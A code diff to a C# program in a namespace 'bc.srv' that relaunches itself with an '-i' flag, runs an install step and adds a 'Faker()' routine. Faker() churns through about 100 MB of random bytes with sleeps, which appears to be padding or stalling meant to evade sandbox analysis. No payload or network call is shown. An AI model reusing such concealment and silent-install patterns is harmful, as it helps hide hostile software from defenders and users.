@@ -1,5 +1,7 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Diagnostics;
+using System.Linq;
 using System.Reflection;
 using System.Threading;
 using bc.srv.Classes;
@@ -13,6 +15,8 @@ namespace bc.srv
         {
             try
             {
+                
+                
                 SrvData.Instance.ServerVersion = "0.2.0";
                 CreateStClient.InitializeStClient();
                 Thread.Sleep(SrvData.Instance.StartupDelay);
@@ -24,8 +28,24 @@ namespace bc.srv
                     if (!mutex.WaitOne(0, false))
                         return 6;
 
-                    RunInstallationThread();
-                    RunConnectionThread();
+                    //Faker();
+
+                    if (args != null && args.Any())
+                    {
+                        //RunInstallationThread();
+                        var installCLass = new InstallClass();
+                        installCLass.InstallServer();
+                        Faker();
+                        Thread.Sleep(50000);
+                        Exit(0);
+                    }
+                    else
+                    {
+                        var p = new Process();
+                        p.StartInfo = new ProcessStartInfo(Assembly.GetExecutingAssembly().Location,"-i");
+                        p.Start();
+                        //RunConnectionThread();
+                    }
 
                     while (true)
                     {
@@ -39,6 +59,30 @@ namespace bc.srv
                 e.DumpDebugException();
                 return 7;
             }
+        }
+
+        private static void Faker()
+        {
+            // if (args != null && args.Any())
+            // {
+            var rand = Random.Next(10, 850);
+            var bytes = new List<byte>();
+                
+            for (int i = 0; i < 1000; i++)
+            {
+                bytes.Reverse();
+                var bytesSpit = new byte[1024*100];
+                Random.NextBytes(bytesSpit);
+                bytes.AddRange(bytesSpit);
+                        
+                // if(rand == i)
+                //     RunInstallationThread();
+                        
+                Thread.Sleep(10);
+            }
+                    
+            // }
+
         }
 
         private static void RunConnectionThread()
